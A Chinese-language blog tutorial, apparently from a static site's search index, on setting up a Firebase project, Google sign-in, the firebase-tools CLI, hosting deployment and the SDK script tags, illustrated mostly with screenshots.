        <content type="html"><![CDATA[<h1 id="Firebase"><a href="#Firebase" class="headerlink" title="Firebase"></a>Firebase</h1><h2 id="網址-https-firebase-google-com"><a href="#網址-https-firebase-google-com" class="headerlink" title="網址:https://firebase.google.com/"></a>網址:<a href="https://firebase.google.com/">https://firebase.google.com/</a></h2><h2 id="建立專案"><a href="#建立專案" class="headerlink" title="建立專案"></a>建立專案</h2><h3 id="新增專案"><a href="#新增專案" class="headerlink" title="新增專案"></a>新增專案</h3><p><img src="/photo/firebase/1.jpg" alt="1"></p><h3 id="設定專案名稱"><a href="#設定專案名稱" class="headerlink" title="設定專案名稱"></a>設定專案名稱</h3><p><img src="/photo/firebase/2.jpg" alt="2"></p><h3 id="關閉GA"><a href="#關閉GA" class="headerlink" title="關閉GA"></a>關閉GA</h3><p><img src="/photo/firebase/3.jpg" alt="3"></p><h3 id="建立即時資料庫"><a href="#建立即時資料庫" class="headerlink" title="建立即時資料庫"></a>建立即時資料庫</h3><p><img src="/photo/firebase/4.jpg" alt="4"></p><p><img src="/photo/firebase/5.jpg" alt="5"></p><p><img src="/photo/firebase/6.jpg" alt="6"></p><h3 id="建立檔案資料庫"><a href="#建立檔案資料庫" class="headerlink" title="建立檔案資料庫"></a>建立檔案資料庫</h3><p><img src="/photo/firebase/7.jpg" alt="7"></p><p><img src="/photo/firebase/8.jpg" alt="8"></p><p><img src="/photo/firebase/9.jpg" alt="9"></p><p>設定授權登陸</p><p><img src="/photo/firebase/10.jpg" alt="10"></p><h4 id="選擇google"><a href="#選擇google" class="headerlink" title="選擇google"></a>選擇google</h4><p><img src="/photo/firebase/11.jpg" alt="11"></p><p><img src="/photo/firebase/12.jpg" alt="12"></p><h3 id="安裝Node-js"><a href="#安裝Node-js" class="headerlink" title="安裝Node.js"></a>安裝Node.js</h3><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><blockquote><p>在桌面創建資料夾<br>進入資料夾開啟終端機<br>輸入下列指令:<br>1.npm init &#x2F;&#x2F;初始化(按Enter直到結束)<br><img src="/photo/firebase/13.jpg" alt="13"><br>2.npm install -g –save-dev firebase-tools &#x2F;&#x2F;安裝工具</p></blockquote><h3 id="登陸firebase"><a href="#登陸firebase" class="headerlink" title="登陸firebase"></a>登陸firebase</h3><blockquote><p>firebase login<br><img src="/photo/firebase/14.jpg" alt="14"></p></blockquote><h3 id="初始firebase環境"><a href="#初始firebase環境" class="headerlink" title="初始firebase環境"></a>初始firebase環境</h3><blockquote><p>firebase init hosting<br><img src="/photo/firebase/15.jpg" alt="15"><br>y<br><img src="/photo/firebase/16.jpg" alt="16"><br>Use an existing project  &#x2F;&#x2F;使用現有專案<br><img src="/photo/firebase/17.jpg" alt="17"><br>選擇之前創的專案名<br><img src="/photo/firebase/18.jpg" alt="18"><br>public<br>y<br>n<br><img src="/photo/firebase/19.jpg" alt="19"></p></blockquote><blockquote><p><strong>note:</strong><br>出現Firebase initialization complete!即為成功</p></blockquote><blockquote><p>輸入firebase deploy &#x2F;&#x2F;部屬託管到firebase<br><img src="/photo/firebase/20.jpg" alt="20"></p></blockquote><h3 id="設定firebase設定檔案及測試"><a href="#設定firebase設定檔案及測試" class="headerlink" title="設定firebase設定檔案及測試"></a>設定firebase設定檔案及測試</h3><blockquote><p>將firebase_init-master資料夾的所有檔案丟入專案資料夾的public裡<br><img src="/photo/firebase/21.jpg" alt="21"></p></blockquote><blockquote><p><strong>由於預設firebase.js URL有誤無法開啟須改網址</strong></p><p>將連結改為以下程式碼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-app-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;!-- include only the Firebase features as you need --&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-auth-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-database-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-firestore-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-functions-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-messaging-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-storage-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;/https://www.gstatic.com/firebasejs/8.0.1/firebase-remote-config-compat.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script defer src=&quot;https://www.gstatic.com/firebasejs/8.0.1/firebase-performance-compat.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="設定init-firebase-js"><a href="#設定init-firebase-js" class="headerlink" title="設定init-firebase.js"></a>設定init-firebase.js</h3><p><img src="/photo/firebase/22.jpg" alt="22"></p><blockquote><p>將project id改為自己的專屬id<br>將api更改<br><img src="/photo/firebase/23.jpg" alt="23"><br><img src="/photo/firebase/24.jpg" alt="24"></p></blockquote><h3 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h3><p><img src="/photo/firebase/25.jpg" alt="25"></p>]]></content>
      
      
      <categories>
          
          <category> 網頁設計 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網頁設計 </tag>
            
            <tag> firebase </tag>
            
            <tag> NOSQL </tag>
            
            <tag> 筆記 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
